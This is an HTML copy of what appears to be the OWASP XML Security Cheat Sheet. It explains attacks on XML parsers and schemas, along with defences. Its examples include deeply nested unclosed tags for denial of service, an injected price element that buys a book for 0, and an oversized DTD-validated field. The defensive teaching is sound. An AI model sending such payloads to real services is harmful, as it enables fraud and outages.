
<!DOCTYPE HTML>
<html lang="en" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>XML Security  Â· OWASP Cheat Sheet Series</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchors/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    
    <link rel="prev" href="XML_External_Entity_Prevention_Cheat_Sheet.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        <li class="header">Cheatsheets</li>
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="Index.html">
            
                <a href="Index.html">
            
                    
                    Index Alphabetical
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="IndexASVS.html">
            
                <a href="IndexASVS.html">
            
                    
                    Index ASVS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="IndexProactiveControls.html">
            
                <a href="IndexProactiveControls.html">
            
                    
                    Index Proactive Controls
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="AJAX_Security_Cheat_Sheet.html">
            
                <a href="AJAX_Security_Cheat_Sheet.html">
            
                    
                    AJAX Security 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="Abuse_Case_Cheat_Sheet.html">
            
                <a href="Abuse_Case_Cheat_Sheet.html">
            
                    
                    Abuse Case 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="Access_Control_Cheat_Sheet.html">
            
                <a href="Access_Control_Cheat_Sheet.html">
            
                    
                    Access Control 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="Attack_Surface_Analysis_Cheat_Sheet.html">
            
                <a href="Attack_Surface_Analysis_Cheat_Sheet.html">
            
                    
                    Attack Surface Analysis 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9" data-path="Authentication_Cheat_Sheet.html">
            
                <a href="Authentication_Cheat_Sheet.html">
            
                    
                    Authentication 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.10" data-path="Authorization_Testing_Automation.html">
            
                <a href="Authorization_Testing_Automation.html">
            
                    
                    Authorization Testing Automation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11" data-path="Bean_Validation_Cheat_Sheet.html">
            
                <a href="Bean_Validation_Cheat_Sheet.html">
            
                    
                    Bean Validation 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.12" data-path="C-Based_Toolchain_Hardening.html">
            
                <a href="C-Based_Toolchain_Hardening.html">
            
                    
                    C-Based Toolchain Hardening
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.13" data-path="C-Based_Toolchain_Hardening_Cheat_Sheet.html">
            
                <a href="C-Based_Toolchain_Hardening_Cheat_Sheet.html">
            
                    
                    C-Based Toolchain Hardening 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.14" data-path="Choosing_and_Using_Security_Questions_Cheat_Sheet.html">
            
                <a href="Choosing_and_Using_Security_Questions_Cheat_Sheet.html">
            
                    
                    Choosing and Using Security Questions 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.15" data-path="Clickjacking_Defense_Cheat_Sheet.html">
            
                <a href="Clickjacking_Defense_Cheat_Sheet.html">
            
                    
                    Clickjacking Defense 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16" data-path="Content_Security_Policy_Cheat_Sheet.html">
            
                <a href="Content_Security_Policy_Cheat_Sheet.html">
            
                    
                    Content Security Policy 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.17" data-path="Credential_Stuffing_Prevention_Cheat_Sheet.html">
            
                <a href="Credential_Stuffing_Prevention_Cheat_Sheet.html">
            
                    
                    Credential Stuffing Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.18" data-path="Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">
            
                <a href="Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">
            
                    
                    Cross-Site Request Forgery Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.19" data-path="Cross_Site_Scripting_Prevention_Cheat_Sheet.html">
            
                <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html">
            
                    
                    Cross Site Scripting Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.20" data-path="Cryptographic_Storage_Cheat_Sheet.html">
            
                <a href="Cryptographic_Storage_Cheat_Sheet.html">
            
                    
                    Cryptographic Storage 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.21" data-path="DOM_based_XSS_Prevention_Cheat_Sheet.html">
            
                <a href="DOM_based_XSS_Prevention_Cheat_Sheet.html">
            
                    
                    DOM based XSS Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.22" data-path="Denial_of_Service_Cheat_Sheet.html">
            
                <a href="Denial_of_Service_Cheat_Sheet.html">
            
                    
                    Denial of Service 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.23" data-path="Deserialization_Cheat_Sheet.html">
            
                <a href="Deserialization_Cheat_Sheet.html">
            
                    
                    Deserialization 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.24" data-path="Docker_Security_Cheat_Sheet.html">
            
                <a href="Docker_Security_Cheat_Sheet.html">
            
                    
                    Docker Security 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.25" data-path="DotNet_Security_Cheat_Sheet.html">
            
                <a href="DotNet_Security_Cheat_Sheet.html">
            
                    
                    DotNet Security 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.26" data-path="Error_Handling_Cheat_Sheet.html">
            
                <a href="Error_Handling_Cheat_Sheet.html">
            
                    
                    Error Handling 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.27" data-path="Forgot_Password_Cheat_Sheet.html">
            
                <a href="Forgot_Password_Cheat_Sheet.html">
            
                    
                    Forgot Password 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.28" data-path="HTML5_Security_Cheat_Sheet.html">
            
                <a href="HTML5_Security_Cheat_Sheet.html">
            
                    
                    HTML5 Security 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.29" data-path="HTTP_Strict_Transport_Security_Cheat_Sheet.html">
            
                <a href="HTTP_Strict_Transport_Security_Cheat_Sheet.html">
            
                    
                    HTTP Strict Transport Security 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.30" data-path="Injection_Prevention_Cheat_Sheet.html">
            
                <a href="Injection_Prevention_Cheat_Sheet.html">
            
                    
                    Injection Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.31" data-path="Injection_Prevention_Cheat_Sheet_in_Java.html">
            
                <a href="Injection_Prevention_Cheat_Sheet_in_Java.html">
            
                    
                    Injection Prevention  in Java
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.32" data-path="Input_Validation_Cheat_Sheet.html">
            
                <a href="Input_Validation_Cheat_Sheet.html">
            
                    
                    Input Validation 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.33" data-path="Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html">
            
                <a href="Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html">
            
                    
                    Insecure Direct Object Reference Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.34" data-path="JAAS_Cheat_Sheet.html">
            
                <a href="JAAS_Cheat_Sheet.html">
            
                    
                    JAAS 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.35" data-path="JSON_Web_Token_Cheat_Sheet_for_Java.html">
            
                <a href="JSON_Web_Token_Cheat_Sheet_for_Java.html">
            
                    
                    JSON Web Token  for Java
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.36" data-path="Key_Management_Cheat_Sheet.html">
            
                <a href="Key_Management_Cheat_Sheet.html">
            
                    
                    Key Management 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.37" data-path="LDAP_Injection_Prevention_Cheat_Sheet.html">
            
                <a href="LDAP_Injection_Prevention_Cheat_Sheet.html">
            
                    
                    LDAP Injection Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.38" data-path="Logging_Cheat_Sheet.html">
            
                <a href="Logging_Cheat_Sheet.html">
            
                    
                    Logging 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.39" data-path="Mass_Assignment_Cheat_Sheet.html">
            
                <a href="Mass_Assignment_Cheat_Sheet.html">
            
                    
                    Mass Assignment 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.40" data-path="Microservices_based_Security_Arch_Doc_Cheat_Sheet.html">
            
                <a href="Microservices_based_Security_Arch_Doc_Cheat_Sheet.html">
            
                    
                    Microservices based Security Arch Doc 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.41" data-path="Multifactor_Authentication_Cheat_Sheet.html">
            
                <a href="Multifactor_Authentication_Cheat_Sheet.html">
            
                    
                    Multifactor Authentication 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.42" data-path="Nodejs_security_cheat_sheet.html">
            
                <a href="Nodejs_security_cheat_sheet.html">
            
                    
                    Nodejs security cheat sheet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.43" data-path="OS_Command_Injection_Defense_Cheat_Sheet.html">
            
                <a href="OS_Command_Injection_Defense_Cheat_Sheet.html">
            
                    
                    OS Command Injection Defense 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.44" data-path="PHP_Configuration_Cheat_Sheet.html">
            
                <a href="PHP_Configuration_Cheat_Sheet.html">
            
                    
                    PHP Configuration 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.45" data-path="Password_Storage_Cheat_Sheet.html">
            
                <a href="Password_Storage_Cheat_Sheet.html">
            
                    
                    Password Storage 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.46" data-path="Pinning_Cheat_Sheet.html">
            
                <a href="Pinning_Cheat_Sheet.html">
            
                    
                    Pinning 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.47" data-path="Protect_FileUpload_Against_Malicious_File.html">
            
                <a href="Protect_FileUpload_Against_Malicious_File.html">
            
                    
                    Protect FileUpload Against Malicious File
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.48" data-path="Query_Parameterization_Cheat_Sheet.html">
            
                <a href="Query_Parameterization_Cheat_Sheet.html">
            
                    
                    Query Parameterization 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.49" data-path="REST_Assessment_Cheat_Sheet.html">
            
                <a href="REST_Assessment_Cheat_Sheet.html">
            
                    
                    REST Assessment 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.50" data-path="REST_Security_Cheat_Sheet.html">
            
                <a href="REST_Security_Cheat_Sheet.html">
            
                    
                    REST Security 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.51" data-path="Ruby_on_Rails_Cheatsheet.html">
            
                <a href="Ruby_on_Rails_Cheatsheet.html">
            
                    
                    Ruby on Rails Cheatsheet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.52" data-path="SAML_Security_Cheat_Sheet.html">
            
                <a href="SAML_Security_Cheat_Sheet.html">
            
                    
                    SAML Security 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.53" data-path="SQL_Injection_Prevention_Cheat_Sheet.html">
            
                <a href="SQL_Injection_Prevention_Cheat_Sheet.html">
            
                    
                    SQL Injection Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.54" data-path="Securing_Cascading_Style_Sheets_Cheat_Sheet.html">
            
                <a href="Securing_Cascading_Style_Sheets_Cheat_Sheet.html">
            
                    
                    Securing Cascading Style Sheets 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.55" data-path="Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">
            
                <a href="Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">
            
                    
                    Server Side Request Forgery Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.56" data-path="Session_Management_Cheat_Sheet.html">
            
                <a href="Session_Management_Cheat_Sheet.html">
            
                    
                    Session Management 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.57" data-path="TLS_Cipher_String_Cheat_Sheet.html">
            
                <a href="TLS_Cipher_String_Cheat_Sheet.html">
            
                    
                    TLS Cipher String 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.58" data-path="Third_Party_Javascript_Management_Cheat_Sheet.html">
            
                <a href="Third_Party_Javascript_Management_Cheat_Sheet.html">
            
                    
                    Third Party Javascript Management 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.59" data-path="Threat_Modeling_Cheat_Sheet.html">
            
                <a href="Threat_Modeling_Cheat_Sheet.html">
            
                    
                    Threat Modeling 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.60" data-path="Transaction_Authorization_Cheat_Sheet.html">
            
                <a href="Transaction_Authorization_Cheat_Sheet.html">
            
                    
                    Transaction Authorization 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.61" data-path="Transport_Layer_Protection_Cheat_Sheet.html">
            
                <a href="Transport_Layer_Protection_Cheat_Sheet.html">
            
                    
                    Transport Layer Protection 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.62" data-path="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html">
            
                <a href="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html">
            
                    
                    Unvalidated Redirects and Forwards 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.63" data-path="User_Privacy_Protection_Cheat_Sheet.html">
            
                <a href="User_Privacy_Protection_Cheat_Sheet.html">
            
                    
                    User Privacy Protection 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.64" data-path="Virtual_Patching_Cheat_Sheet.html">
            
                <a href="Virtual_Patching_Cheat_Sheet.html">
            
                    
                    Virtual Patching 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.65" data-path="Vulnerability_Disclosure_Cheat_Sheet.html">
            
                <a href="Vulnerability_Disclosure_Cheat_Sheet.html">
            
                    
                    Vulnerability Disclosure 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.66" data-path="Vulnerable_Dependency_Management_Cheat_Sheet.html">
            
                <a href="Vulnerable_Dependency_Management_Cheat_Sheet.html">
            
                    
                    Vulnerable Dependency Management 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.67" data-path="Web_Service_Security_Cheat_Sheet.html">
            
                <a href="Web_Service_Security_Cheat_Sheet.html">
            
                    
                    Web Service Security 
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.68" data-path="XML_External_Entity_Prevention_Cheat_Sheet.html">
            
                <a href="XML_External_Entity_Prevention_Cheat_Sheet.html">
            
                    
                    XML External Entity Prevention 
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.69" data-path="XML_Security_Cheat_Sheet.html">
            
                <a href="XML_Security_Cheat_Sheet.html">
            
                    
                    XML Security 
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >XML Security </a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="introduction"><a name="introduction" class="plugin-anchor" href="#introduction"><i class="fa fa-link" aria-hidden="true"></i></a>Introduction</h1>
<p>Specifications for XML and XML schemas include multiple security flaws. At the same time, these specifications provide the tools required to protect XML applications. Even though we use XML schemas to define the security of XML documents, they can be used to perform a variety of attacks: file retrieval, server side request forgery, port scanning, or brute forcing. This cheat sheet exposes how to exploit the different possibilities in libraries and software divided in two sections:</p>
<ul>
<li><strong>Malformed XML Documents</strong>: vulnerabilities using not well formed documents.</li>
<li><strong>Invalid XML Documents</strong>: vulnerabilities using documents that do not have the expected structure.</li>
</ul>
<h1 id="malformed-xml-documents"><a name="malformed-xml-documents" class="plugin-anchor" href="#malformed-xml-documents"><i class="fa fa-link" aria-hidden="true"></i></a>Malformed XML Documents</h1>
<p>The W3C XML specification defines a set of principles that XML documents must follow to be considered well formed. When a document violates any of these principles, it must be considered a fatal error and the data it contains is considered malformed. Multiple tactics will cause a malformed document: removing an ending tag, rearranging the order of elements into a nonsensical structure, introducing forbidden characters, and so on. The XML parser should stop execution once detecting a fatal error. The document should not undergo any additional processing, and the application should display an error message.</p>
<p>The recommendation to avoid these vulnerabilities are to use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents. In addition, use only well-formed documents and validate the contents of each element and attribute to process only valid values within predefined boundaries.</p>
<h2 id="more-time-required"><a name="more-time-required" class="plugin-anchor" href="#more-time-required"><i class="fa fa-link" aria-hidden="true"></i></a>More Time Required</h2>
<p>A malformed document may affect the consumption of Central Processing Unit (CPU) resources. In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).</p>
<p>To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document. Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.</p>
<h2 id="applications-processing-malformed-data"><a name="applications-processing-malformed-data" class="plugin-anchor" href="#applications-processing-malformed-data"><i class="fa fa-link" aria-hidden="true"></i></a>Applications Processing Malformed Data</h2>
<p>Certain XML parsers have the ability to recover malformed documents. They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document&apos;s noncompliance with the specifications. Since there are no predefined rules for the recovery process, the approach and results may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.</p>
<p>The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:</p>
<h3 id="malformed-document-to-malformed-document"><a name="malformed-document-to-malformed-document" class="plugin-anchor" href="#malformed-document-to-malformed-document"><i class="fa fa-link" aria-hidden="true"></i></a>Malformed Document to Malformed Document</h3>
<p>According to the XML specification, the string <code>--</code> (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">element</span>&gt;</span>
 <span class="hljs-comment">&lt;!-- one
  &lt;!-- another comment
 comment --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">element</span>&gt;</span>
</code></pre>
<h3 id="well-formed-document-to-well-formed-document-normalized"><a name="well-formed-document-to-well-formed-document-normalized" class="plugin-anchor" href="#well-formed-document-to-well-formed-document-normalized"><i class="fa fa-link" aria-hidden="true"></i></a>Well-Formed Document to Well-Formed Document Normalized</h3>
<p>Certain parsers may consider normalizing the contents of your <code>CDATA</code> sections. This means that they will update the special characters contained in the <code>CDATA</code> section to contain the safe versions of these characters even though is not required:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">element</span>&gt;</span>
 &lt;![CDATA[&lt;script&gt;a=1;&lt;/script&gt;]]&gt;
<span class="hljs-tag">&lt;/<span class="hljs-name">element</span>&gt;</span>
</code></pre>
<p>Normalization of a <code>CDATA</code> section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">element</span>&gt;</span>
 &amp;lt;script&amp;gt;a=1;&amp;lt;/script&amp;gt;
<span class="hljs-tag">&lt;/<span class="hljs-name">element</span>&gt;</span>
</code></pre>
<h2 id="coercive-parsing"><a name="coercive-parsing" class="plugin-anchor" href="#coercive-parsing"><i class="fa fa-link" aria-hidden="true"></i></a>Coercive Parsing</h2>
<p>A coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine&apos;s resources and cause a denial of service on the target. Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">A1</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">A2</span>&gt;</span> 
  <span class="hljs-tag">&lt;<span class="hljs-name">A3</span>&gt;</span>
   ...
    <span class="hljs-tag">&lt;<span class="hljs-name">A30000</span>&gt;</span>
</code></pre>
<h2 id="violation-of-xml-specification-rules"><a name="violation-of-xml-specification-rules" class="plugin-anchor" href="#violation-of-xml-specification-rules"><i class="fa fa-link" aria-hidden="true"></i></a>Violation of XML Specification Rules</h2>
<p>Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.</p>
<h1 id="invalid-xml-documents"><a name="invalid-xml-documents" class="plugin-anchor" href="#invalid-xml-documents"><i class="fa fa-link" aria-hidden="true"></i></a>Invalid XML Documents</h1>
<p>Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values. Schemas specify restrictions that help identify whether documents are valid. A valid document is well formed and complies with the restrictions of a schema, and more than one schema can be used to validate a document. These restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.</p>
<p>The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a>) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.</p>
<h2 id="document-without-schema"><a name="document-without-schema" class="plugin-anchor" href="#document-without-schema"><i class="fa fa-link" aria-hidden="true"></i></a>Document without Schema</h2>
<p>Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an <code>id</code> value related to an item and a certain <code>price</code>. The user may only introduce a certain <code>id</code> value using the web interface:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">buy</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">buy</span>&gt;</span>
</code></pre>
<p>If there is no control on the document&apos;s structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">buy</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">buy</span>&gt;</span>
</code></pre>
<p>Notice again how the value 123 is supplied as an <code>id</code>, but now the document includes additional opening and closing tags. The attacker closed the <code>id</code> element and sets a bogus <code>price</code> element to the value 0. The final step to keep the structure well-formed is to add one empty <code>id</code> element. After this, the application adds the closing tag for <code>id</code> and set the <code>price</code> to 10. If the application processes only the first values provided for the id and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.</p>
<h2 id="unrestrictive-schema"><a name="unrestrictive-schema" class="plugin-anchor" href="#unrestrictive-schema"><i class="fa fa-link" aria-hidden="true"></i></a>Unrestrictive Schema</h2>
<p>Certain schemas do not offer enough restrictions for the type of data that each element can receive. This is what normally happens when using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a>; it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person&apos;s <code>age</code> is validated against an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> schema:</p>
<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE person [
 &lt;!ELEMENT person (name, age)&gt;
 &lt;!ELEMENT name (#PCDATA)&gt;
 &lt;!ELEMENT age (#PCDATA)&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">person</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>John Doe<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>11111..(1.000.000digits)..11111<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">person</span>&gt;</span>
</code></pre>
<p>The previous document contains an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> with a root element named <code>person</code>. This element contains two elements in a specific order: <code>name</code> and then <code>age</code>. The element <code>name</code> is then defined to contain <code>PCDATA</code> as well as the element <code>age</code>. After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the <code>age</code> element contains one million digits. Since there are no restrictions on the maximum size for the <code>age</code> element, this one-million-digit string could be sent to the server for this element. Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents. Since it is not possible to indicate specific restrictions (a maximum length for the element <code>name</code> or a valid range for the element <code>age</code>), this type of schema increases the risk of affecting the integrity and availability of resources.</p>
<h2 id="improper-data-validation"><a name="improper-data-validation" class="plugin-anchor" href="#improper-data-validation"><i class="fa fa-link" aria-hidden="true"></i></a>Improper Data Validation</h2>
<p>When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application&apos;s functionality with unexpected values.</p>
<h3 id="string-data-types"><a name="string-data-types" class="plugin-anchor" href="#string-data-types"><i class="fa fa-link" aria-hidden="true"></i></a>String Data Types</h3>
<p>Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;CipherData&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xenc:CipherDataType&quot;</span>/&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">complexType</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;CipherDataType&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">choice</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;CipherValue&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;base64Binary&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">element</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;xenc:CipherReference&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">choice</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">complexType</span>&gt;</span>
</code></pre>
